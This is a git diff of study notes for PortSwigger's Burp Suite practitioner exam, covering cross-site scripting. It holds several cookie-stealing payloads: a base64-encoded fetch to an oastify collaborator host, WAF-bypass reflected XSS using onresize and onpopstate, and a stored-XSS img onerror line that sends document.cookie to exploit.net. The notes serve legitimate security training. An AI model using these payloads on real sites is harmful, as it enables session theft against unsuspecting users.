@@ -9,7 +9,7 @@ PortSwigger Academy - Burp Suite Certified Practitioner Exam Study Notes
 
 ### Cookie Stealers
 
-#### Reflected XSS in Search with WAF
+### Reflected XSS in Search with WAF
 >Search with Reflected XSS deliver Phishing link to victim with cookie stealing payload
 <sub>WAF is preventing dangerous search filters and tags!</sub>
 ```JavaScript
@@ -42,13 +42,13 @@ ZmV0Y2goImh0dHBzOi8vODM5Y2t0dTd1b2dlZG02YTFranV5M291dGx6Y24yYnIub2FzdGlmeS5jb20v
 ```
 ![(Deliver reflected xss to steal victim cookie.](deliver-reflected-xss-to-steal-victim-cookie.png)
 
-#### Reflected XSS in Search with blocked Tags
+### Reflected XSS in Search with blocked Tags
 >Reflected XSS into HTML context with most tags and attributes blocked Bypass WAF
-<sup>Body and event 'onresize' is only allowed</sup>
+<sup>Body and event **'onresize'** is only allowed</sup>
 ```JavaScript
 ?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
 ```
-<sup>Body and event 'onpopstate' is only allowed</sup>
+<sup>Body and event **'onpopstate'** is only allowed</sup>
 ```JavaScript
 ?search=%22%3E%3Cbody%20onpopstate=print()>
 ```
@@ -59,6 +59,8 @@ ZmV0Y2goImh0dHBzOi8vODM5Y2t0dTd1b2dlZG02YTFranV5M291dGx6Y24yYnIub2FzdGlmeS5jb20v
 [URL Decode and Encode](https://www.urldecoder.org/) 
 [BASE64 Decode and Encode](https://www.base64encode.org/)    
   
+### Stored XSS
+
 #### Blog post comment section
 ```html
 <img src="1" onerror="window.location='http://exploit.net/cookie='+document.cookie">
